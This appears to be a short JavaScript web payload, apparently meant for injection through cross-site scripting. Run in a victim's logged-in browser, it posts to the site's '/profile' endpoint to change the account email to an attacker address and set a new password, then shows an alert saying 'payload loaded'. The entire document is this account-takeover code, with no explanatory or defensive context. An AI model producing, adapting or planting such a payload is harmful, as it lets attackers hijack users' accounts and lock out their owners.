const data = new URLSearchParams({
  email: "attacker@example.test",
  password: "new-password-123"
});

fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: data.toString()
});
alert("payload loaded");
